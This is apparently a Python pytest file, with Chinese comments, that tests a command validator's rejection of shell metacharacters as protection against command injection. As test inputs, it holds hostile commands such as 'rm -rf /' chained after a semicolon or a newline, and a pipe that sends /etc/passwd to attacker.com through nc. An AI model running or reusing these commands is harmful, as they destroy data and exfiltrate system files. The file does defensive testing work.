"""InnovationManager 安全测试

测试命令注入防护措施
"""
import pytest
from backend.services.learning.innovation_manager import InnovationManager


class TestCommandValidation:
    """命令验证测试"""

    def setup_method(self):
        """每个测试前创建管理器实例"""
        self.manager = InnovationManager(project_root="/tmp/test")

    def test_validate_safe_command(self):
        """测试安全命令通过验证"""
        safe_commands = [
            "pytest tests/",
            "npm test",
            "python -m pytest",
            "make build",
            "cargo test",
            "mvn test"
        ]

        for cmd in safe_commands:
            # 应该不抛出异常
            self.manager._validate_command(cmd)

    def test_validate_command_with_semicolon(self):
        """测试拒绝包含分号的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("pytest tests/; rm -rf /")

    def test_validate_command_with_pipe(self):
        """测试拒绝包含管道的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("cat /etc/passwd | nc attacker.com 1234")

    def test_validate_command_with_ampersand(self):
        """测试拒绝包含&的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("pytest & malicious_command")

    def test_validate_command_with_backtick(self):
        """测试拒绝包含反引号的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("echo `whoami`")

    def test_validate_command_with_dollar_sign(self):
        """测试拒绝包含$的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("echo $HOME")

    def test_validate_command_with_parentheses(self):
        """测试拒绝包含括号的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("$(malicious_command)")

    def test_validate_command_with_redirects(self):
        """测试拒绝包含重定向的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("cat file > /tmp/output")

        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("malicious < /etc/passwd")

    def test_validate_command_with_newline(self):
        """测试拒绝包含换行符的命令"""
        with pytest.raises(ValueError, match="命令包含危险字符"):
            self.manager._validate_command("pytest tests/\nrm -rf /")

    def test_validate_empty_command(self):
        """测试空命令"""
        # 空命令应该通过（虽然没有实际意义）
        self.manager._validate_command("")

    def test_validate_command_with_spaces(self):
        """测试包含空格的正常命令"""
        # 正常的命令参数应该通过
        self.manager._validate_command("pytest tests/ -v --tb=short")
